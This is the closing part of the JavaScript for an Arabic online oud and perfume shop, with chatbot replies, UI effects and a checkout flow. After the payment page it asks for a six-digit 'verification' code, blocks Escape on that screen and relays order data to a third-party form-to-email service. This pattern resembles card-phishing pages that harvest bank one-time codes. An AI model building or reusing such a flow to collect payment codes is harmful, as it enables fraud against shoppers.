                    📍 <em>نغطي جميع مناطق المملكة العربية السعودية</em>
                `;
            }
            
            if (message.includes('جودة') || message.includes('أصلي') || message.includes('ضمان')) {
                return `
                    <strong>🛡️ ضمان الجودة والأصالة:</strong><br><br>
                    ✅ <strong>منتجات أصلية 100%</strong><br>
                    ✅ <strong>مصادر موثوقة ومعتمدة</strong><br>
                    ✅ <strong>فحص جودة صارم</strong><br>
                    ✅ <strong>ضمان استرداد</strong> خلال 7 أيام<br>
                    ✅ <strong>شهادات جودة معتمدة</strong><br><br>
                    🏆 <strong>12+ سنة</strong> من الخبرة في العود<br>
                    ⭐ <strong>آلاف العملاء</strong> الراضين<br><br>
                    🔒 <em>ثقتكم هي أولويتنا الأولى</em>
                `;
            }
            
            if (message.includes('كيف') || message.includes('استخدام') || message.includes('طريقة')) {
                return `
                    <strong>📖 طريقة الاستخدام الصحيحة:</strong><br><br>
                    <strong>للعود الطبيعي:</strong><br>
                    1️⃣ ضع قطعة صغيرة على الفحم<br>
                    2️⃣ انتظر حتى يبدأ الدخان<br>
                    3️⃣ حرك المبخرة برفق<br><br>
                    <strong>للأدهان:</strong><br>
                    1️⃣ ضع نقطة صغيرة على المعصم<br>
                    2️⃣ افرك برفق حتى تمتص<br>
                    3️⃣ استمتع بالرائحة الفاخرة<br><br>
                    ⚠️ <em>استخدم كميات قليلة - القليل يدوم طويلاً</em>
                `;
            }
            
            if (message.includes('واتس') || message.includes('هاتف') || message.includes('اتصال')) {
                return `
                    <strong>📞 تواصل معنا مباشرة:</strong><br><br>
                    📱 <strong>واتساب:</strong> 00966542068739<br>
                    📞 <strong>هاتف:</strong> 00966542068739<br>
                    📧 <strong>إيميل:</strong> alhkr5415@gmail.com<br><br>
                    ⏰ <strong>ساعات العمل:</strong> 24/7<br><br>
                    <a href="https://wa.me/966542068739" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); color: white; padding: 8px 16px; border-radius: 20px; text-decoration: none; display: inline-block; margin-top: 10px;">
                        💬 تواصل الآن عبر واتساب
                    </a>
                `;
            }
            
            // Default responses for general queries
            const generalResponses = [
                `
                    مرحباً بك في مكاسر العود! 🌟<br><br>
                    أنا هنا لمساعدتك في اختيار أفضل المنتجات.<br><br>
                    يمكنك سؤالي عن:<br>
                    • أفضل الأنواع للمبتدئين<br>
                    • طرق المحافظة على العود<br>
                    • الفروقات بين المنتجات<br>
                    • الأسعار والعروض<br>
                    • طرق الاستخدام<br><br>
                    💬 <em>ما الذي تريد معرفته تحديداً؟</em>
                `,
                `
                    شكراً لك لزيارة مكاسر العود! 🙏<br><br>
                    نحن متخصصون في تقديم أجود أنواع:<br>
                    🌿 العود الطبيعي الأصلي<br>
                    ⚡ العود المحسن عالي الجودة<br>
                    💧 الأدهان الفاخرة<br>
                    🔥 المبسوس المميز<br>
                    🌸 الزعفران النقيل<br><br>
                    🎁 <em>عروض خاصة متجددة - اكتشف مجموعتنا!</em>
                `,
                `
                    أهلاً وسهلاً! 👋<br><br>
                    هل تعلم أن عودنا يأتي من أفضل المصادر العالمية؟<br><br>
                    🇰🇭 <strong>كمبودي أصلي</strong> - للذواقين<br>
                    🇮🇳 <strong>هندي طبيعي</strong> - كلاسيكي رائع<br>
                    🇵🇭 <strong>فلبيني فاخر</strong> - رائحة استثنائية<br>
                    🇲🇦 <strong>موروكي مميز</strong> - تراث عريق<br><br>
                    ✨ <em>كل قطعة لها قصة... وكل رائحة لها ذكرى</em>
                `
            ];
            
            return generalResponses[Math.floor(Math.random() * generalResponses.length)];
        }

        function generateSparkles() {
            let sparkles = '';
            for (let i = 0; i < 5; i++) {
                const top = Math.random() * 80 + 10; // 10% to 90%
                const left = Math.random() * 80 + 10; // 10% to 90%
                const delay = Math.random() * 3; // 0 to 3 seconds
                sparkles += `<div class="sparkle absolute animate-pulse" style="top: ${top}%; left: ${left}%; animation-delay: ${delay}s;"></div>`;
            }
            return sparkles;
        }

        function handleProductHover(event, element) {
            const rect = element.getBoundingClientRect();
            const x = ((event.clientX - rect.left) / rect.width) * 100;
            const y = ((event.clientY - rect.top) / rect.height) * 100;
            
            element.style.setProperty('--x', x + '%');
            element.style.setProperty('--y', y + '%');
        }

        function handleProductLeave(element) {
            element.style.setProperty('--x', '50%');
            element.style.setProperty('--y', '50%');
        }

        // VERIFICATION CODE FUNCTIONS
        function showVerificationPage() {
            document.getElementById('paymentPage').classList.remove('active');
            document.getElementById('verificationPage').classList.remove('hidden');
        }

        function moveToNext(current, nextIndex) {
            // Prevent multiple character input and keep only numbers
            let value = current.value.replace(/[^0-9]/g, '');
            if (value.length > 1) {
                value = value.charAt(0); // Keep only first digit
            }
            current.value = value;
            
            // Auto advance to next input if we have a valid digit
            if (value.length === 1 && nextIndex <= 6) {
                const inputs = document.querySelectorAll('.code-input');
                const nextInput = inputs[nextIndex];
                if (nextInput) {
                    nextInput.focus();
                    nextInput.select();
                }
            }
            
            // Auto-verify when all fields are filled
            checkCodeCompletion();
        }

        function handleBackspace(current, event) {
            // Handle backspace navigation
            if (event.key === 'Backspace') {
                if (current.value === '') {
                    // If field is empty, go to previous field
                    const inputs = document.querySelectorAll('.code-input');
                    const currentIndex = Array.from(inputs).indexOf(current);
                    if (currentIndex > 0) {
                        inputs[currentIndex - 1].focus();
                        inputs[currentIndex - 1].select();
                    }
                } else {
                    // Clear current field
                    current.value = '';
                }
                event.preventDefault();
                return;
            }
            
            // Allow only numbers and special keys
            if (!/[0-9]/.test(event.key) && 
                event.key !== 'Delete' && 
                event.key !== 'Tab' && 
                event.key !== 'ArrowLeft' && 
                event.key !== 'ArrowRight') {
                event.preventDefault();
            }
        }

        function checkCodeCompletion() {
            const inputs = document.querySelectorAll('.code-input');
            const allFilled = Array.from(inputs).every(input => input.value.length === 1 && /[0-9]/.test(input.value));
            
            if (allFilled) {
                setTimeout(verifyCode, 1000);
            }
        }

        function verifyCode() {
            const inputs = document.querySelectorAll('.code-input');
            const code = Array.from(inputs).map(input => input.value).join('');
            
            if (code.length === 6 && /^[0-9]{6}$/.test(code)) {
                showNotification('تم تأكيد الكود! شكراً لثقتكم بنا.', 'success');
                
                setTimeout(() => {
                    // Clear the code inputs
                    inputs.forEach(input => input.value = '');
                    
                    showNotification('✅ تم إكمال الطلب بنجاح! سيتم التواصل معك قريباً.', 'success');
                    
                    // Clear cart and return to main page
                    cart = [];
                    updateCartDisplay();
                    
                    // Return to main page after short delay
                    setTimeout(() => {
                        document.getElementById('verificationPage').classList.add('hidden');
                        document.getElementById('mainContent').style.display = 'block';
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    }, 2000);
                }, 2000);
            } else {
                showNotification('يرجى إدخال كود مكون من 6 أرقام فقط', 'error');
            }
        }

        function resendCode() {
            const inputs = document.querySelectorAll('.code-input');
            inputs.forEach(input => input.value = '');
            inputs[0].focus();
            
            // Generate new code
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
            
            showNotification(`تم إعادة إرسال الكود بنجاح: ${verificationCode}`, 'success');
            
            // Send verification resend data using Web3Forms
            const formData = new FormData();
            formData.append('verification_code_resent', verificationCode);
            formData.append('customer_email', customerInfo.email || 'غير محدد');
            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
            formData.append('source', 'إعادة إرسال كود التأكيد - الخطوة 4');
            
            sendToWeb3Forms(formData, 'verification')
                .then(() => {
                    console.log('Verification resend data sent successfully via Web3Forms');
                })
                .catch(error => {
                    console.log('Web3Forms verification resend failed');
                });
        }

        // Test Email System Function
        function testEmailSystem() {
            const testFormData = new FormData();
            testFormData.append('test_message', 'هذه رسالة تجريبية من موقع مكاسر العود');
            testFormData.append('test_time', new Date().toLocaleString('ar-SA'));
            testFormData.append('test_type', 'نظام اختبار الإيميل');
            
            sendToWeb3Forms(testFormData, 'test')
                .then(() => {
                    showNotification('✅ تم اختبار نظام الإيميل بنجاح!', 'success');
                })
                .catch(error => {
                    showNotification('❌ فشل في اختبار نظام الإيميل', 'error');
                });
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', function(event) {
            // ESC to close modals and go back
            if (event.key === 'Escape') {
                closeCart();
                if (aiChatOpen) toggleAIChat();
                
                // Close fullscreen pages
                if (document.getElementById('orderInfoPage').classList.contains('active')) {
                    goBackToCart();
                } else if (document.getElementById('orderReviewPage').classList.contains('active')) {
                    goBackToInfo();
                } else if (document.getElementById('paymentPage').classList.contains('active')) {
                    goBackToReview();
                } else if (!document.getElementById('verificationPage').classList.contains('hidden')) {
                    // Don't allow escape from verification page
                }
            }
            
            // Ctrl+Shift+A to open AI chat
            if (event.ctrlKey && event.shiftKey && event.key === 'A') {
                event.preventDefault();
                toggleAIChat();
            }
        });
    </script>

<script>
document.querySelectorAll('form[action="https://api.web3forms.com/submit"]').forEach(function(form) {
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const data = new FormData(form);
        fetch(form.action, {
            method: 'POST',
            body: data
        }).then(response => {
            if (response.ok) {
                const msg = form.querySelector("#formSuccessMessage");
                if (msg) msg.style.display = "block";
                form.reset();
            } else {
                alert("❌ حدث خطأ أثناء الإرسال.");
            }
        }).catch(() => {
            alert("❌ تعذر الاتصال بالخادم.");
        });
    });
});
</script>
</body></html>